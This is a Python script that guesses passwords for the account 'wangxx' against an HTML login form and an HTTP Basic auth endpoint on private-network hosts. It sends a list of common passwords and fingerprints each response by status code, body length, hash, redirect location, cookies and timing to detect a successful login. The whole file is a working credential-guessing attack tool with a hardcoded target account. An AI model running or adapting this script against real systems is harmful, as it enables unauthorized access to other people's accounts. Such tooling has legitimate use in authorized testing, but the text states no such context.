#!/usr/bin/env python3
"""
Response Fingerprint Analysis
Analyzes subtle response differences beyond status codes that might indicate authentication states
"""

import requests
import hashlib
import time
from collections import defaultdict

class ResponseAnalyzer:
    def __init__(self):
        self.html_url = 'http://192.168.100.101/dologin.html'
        self.basic_url = 'http://192.168.100.103/basicauth'
        self.username = 'wangxx'
        
        # Test various passwords including edge cases
        self.test_passwords = [
            # Known wrong passwords
            'wrongpass', 'invalid123', 'notpasswd',
            
            # Empty/special chars
            '', ' ', '12345678', 'aaaaaaaa',
            
            # Common patterns
            'password', 'admin123', 'test1234', 'qwerty12',
            
            # From previous analysis
            'passw0rd', 'a1b2c3d4', 'trustno1', '1q2w3e4r'
        ]
    
    def analyze_html_responses(self):
        """Analyze HTML form response patterns"""
        print("HTML Form Response Fingerprint Analysis")
        print("-" * 45)
        
        response_data = []
        
        for password in self.test_passwords:
            try:
                response = requests.post(
                    self.html_url,
                    data={'httpd_username': self.username, 'httpd_password': password},
                    timeout=10,
                    allow_redirects=False
                )
                
                # Collect detailed response metrics
                data = {
                    'password': password,
                    'status_code': response.status_code,
                    'content_length': len(response.text),
                    'content_hash': hashlib.md5(response.text.encode()).hexdigest()[:16],
                    'headers_count': len(response.headers),
                    'location': response.headers.get('Location', ''),
                    'server': response.headers.get('Server', ''),
                    'content_type': response.headers.get('Content-Type', ''),
                    'set_cookie': response.headers.get('Set-Cookie', ''),
                    'response_time': 0  # Will be measured separately
                }
                
                # Measure response time separately
                start = time.time()
                requests.post(
                    self.html_url,
                    data={'httpd_username': self.username, 'httpd_password': password},
                    timeout=5,
                    allow_redirects=False
                )
                data['response_time'] = time.time() - start
                
                response_data.append(data)
                
                time.sleep(0.2)  # Rate limiting
                
            except Exception as e:
                print(f"Error testing {password}: {e}")
                response_data.append({
                    'password': password,
                    'error': str(e)
                })
        
        # Analyze patterns
        print(f"\nAnalyzing {len(response_data)} responses...")
        
        # Group by response characteristics
        by_status = defaultdict(list)
        by_content_len = defaultdict(list)
        by_content_hash = defaultdict(list)
        by_location = defaultdict(list)
        by_timing = defaultdict(list)
        
        for data in response_data:
            if 'error' not in data:
                by_status[data['status_code']].append(data['password'])
                by_content_len[data['content_length']].append(data['password'])
                by_content_hash[data['content_hash']].append(data['password'])
                by_location[data['location']].append(data['password'])
                
                # Group timing into buckets
                timing_bucket = round(data['response_time'], 1)
                by_timing[timing_bucket].append(data['password'])
        
        print("\nResponse Analysis Results:")
        print("=" * 30)
        
        # Check for variations that might indicate different authentication states
        print(f"Status Code Variations: {len(by_status)} different codes")
        for status, passwords in by_status.items():
            print(f"  {status}: {len(passwords)} responses")
            if len(passwords) <= 3:  # Show details for small groups
                print(f"    Passwords: {passwords}")
        
        print(f"\nContent Length Variations: {len(by_content_len)} different lengths")
        for length, passwords in by_content_len.items():
            print(f"  {length} bytes: {len(passwords)} responses")
            if len(passwords) <= 2:  # Show outliers
                print(f"    Passwords: {passwords}")
        
        print(f"\nContent Hash Variations: {len(by_content_hash)} different hashes")
        for hash_val, passwords in by_content_hash.items():
            print(f"  {hash_val}: {len(passwords)} responses")
            if len(passwords) <= 2:  # Show unique responses
                print(f"    Passwords: {passwords}")
        
        print(f"\nRedirect Location Variations: {len(by_location)} different locations")
        for location, passwords in by_location.items():
            print(f"  '{location}': {len(passwords)} responses")
            if location != 'http://192.168.100.101/login.html':
                print(f"    *** NON-STANDARD REDIRECT *** Passwords: {passwords}")
        
        print(f"\nTiming Variations: {len(by_timing)} different timing buckets")
        timing_items = sorted(by_timing.items())
        for timing, passwords in timing_items:
            if len(passwords) <= 3 or timing < 0.1 or timing > 0.5:  # Show outliers
                print(f"  {timing:.1f}s: {passwords}")
        
        # Look for potential authentication indicators
        potential_successes = []
        for data in response_data:
            if 'error' not in data:
                # Check for indicators of different authentication state
                if (data['status_code'] != 302 or 
                    data['location'] != 'http://192.168.100.101/login.html' or
                    data['content_length'] not in [300, 301, 302] or  # Typical redirect size
                    data['set_cookie']):  # New session cookie might indicate success
                    potential_successes.append(data)
        
        if potential_successes:
            print(f"\n*** POTENTIAL AUTHENTICATION ANOMALIES DETECTED ***")
            for data in potential_successes:
                print(f"Password '{data['password']}': Status {data['status_code']}, "
                      f"Location: {data['location']}, Length: {data['content_length']}")
        
        return response_data
    
    def analyze_basic_auth_responses(self):
        """Analyze Basic auth response patterns"""
        print("\n\nHTTP Basic Auth Response Fingerprint Analysis")
        print("-" * 45)
        
        response_data = []
        
        for password in self.test_passwords[:8]:  # Subset for Basic auth
            try:
                import base64
                auth_header = base64.b64encode(f"{self.username}:{password}".encode()).decode()
                
                response = requests.get(
                    self.basic_url,
                    headers={'Authorization': f'Basic {auth_header}'},
                    timeout=5
                )
                
                data = {
                    'password': password,
                    'status_code': response.status_code,
                    'content_length': len(response.text),
                    'content_hash': hashlib.md5(response.text.encode()).hexdigest()[:16],
                    'www_authenticate': response.headers.get('WWW-Authenticate', ''),
                    'content_type': response.headers.get('Content-Type', ''),
                    'server': response.headers.get('Server', '')
                }
                
                response_data.append(data)
                time.sleep(0.3)  # Rate limiting
                
            except Exception as e:
                print(f"Error testing {password}: {e}")
        
        # Analyze patterns
        print(f"\nAnalyzing {len(response_data)} Basic auth responses...")
        
        # Look for variations
        statuses = set(d['status_code'] for d in response_data if 'error' not in d)
        lengths = set(d['content_length'] for d in response_data if 'error' not in d)
        hashes = set(d['content_hash'] for d in response_data if 'error' not in d)
        
        print(f"Status codes: {statuses}")
        print(f"Content lengths: {lengths}")
        print(f"Unique content hashes: {len(hashes)}")
        
        # Check for success indicators
        for data in response_data:
            if 'error' not in data and data['status_code'] == 200:
                print(f"*** SUCCESS: Password '{data['password']}' returned status 200 ***")
                return response_data
        
        # Check for unusual responses
        unusual = [d for d in response_data if 'error' not in d and 
                  (d['status_code'] != 401 or d['content_length'] < 200 or d['content_length'] > 400)]
        
        if unusual:
            print("Unusual responses detected:")
            for data in unusual:
                print(f"  {data['password']}: Status {data['status_code']}, Length {data['content_length']}")
        
        return response_data
    
    def run_analysis(self):
        """Run complete response fingerprint analysis"""
        print("Response Fingerprint Analysis")
        print("=" * 50)
        
        html_results = self.analyze_html_responses()
        basic_results = self.analyze_basic_auth_responses()
        
        print("\n" + "=" * 50)
        print("RESPONSE FINGERPRINT ANALYSIS COMPLETE")
        print("=" * 50)
        
        # Summary
        total_tests = len(html_results) + len(basic_results)
        print(f"Total responses analyzed: {total_tests}")
        
        # Look for any authentication successes
        successes = []
        for data in html_results + basic_results:
            if 'error' not in data:
                if (data['status_code'] == 200 or 
                    (data.get('location') and 
                     data['location'] != 'http://192.168.100.101/login.html')):
                    successes.append(data)
        
        if successes:
            print("\n*** AUTHENTICATION SUCCESSES DETECTED ***")
            for data in successes:
                print(f"Password: {data['password']}, Details: {data}")
        else:
            print("\nNo authentication successes detected through response fingerprinting.")
        
        return {'html': html_results, 'basic': basic_results}

if __name__ == "__main__":
    analyzer = ResponseAnalyzer()
    results = analyzer.run_analysis()